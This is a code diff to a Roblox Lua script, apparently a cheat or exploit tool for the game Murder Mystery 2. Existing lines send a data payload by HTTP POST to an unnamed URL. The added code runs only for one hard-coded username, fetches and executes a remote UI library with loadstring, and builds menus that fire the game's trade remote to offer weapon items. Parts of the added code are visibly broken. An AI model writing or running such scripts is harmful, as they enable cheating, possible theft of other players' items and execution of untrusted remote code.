@@ -880,7 +880,62 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+list = {"x3x1g"}
+checkplayer = false
+if table.find(list, game.Players.LocalPlayer.Name) then
+ checkplayer = true
+end
+if checkplayer == true then
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Murder Mystery 2 Script By GTAonvova", HidePremium = false, IntroIcon = "", IntroText = "Myulee Hub", SaveConfig = true, ConfigFolder = "OrionTest"})
+local Tab = Window:MakeTab({
+	Name = "",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+local plrs = game.Players
 
+local playerNames = {}
+local players = game.Players.LocalPlayer.PlayerGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame.Container:GetChildren()
+
+for _, player in ipairs(players) do
+    table.insert(playerNames, player.Name)
+end
+Tab:AddDropdown({
+  Name = "S",
+  Options = playerNames,
+  Default = "2",
+  Callback = function(sss)
+    plrs:FindFirstChild(sss)
+        local targetPlayer = plrs:FindFirstChild(sss)
+        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            -- Teleporting your character to the selected player's position
+            local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
+            local localPlayerRoot = plrs.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            
+        local args = {
+        [1] = tonumber(sss),
+        [2] = "Weapons"
+    }
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+            end
+
+  end
+
+})
+Tab:AddButton({
+    Name = "Button",
+    Callback = function()
+        local args = {
+        [1] = tonumber(sss),
+        [2] = "Weapons"
+    }
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+end
+})
+end
 Player = game.Players.LocalPlayer
 Pl = game.Players
 
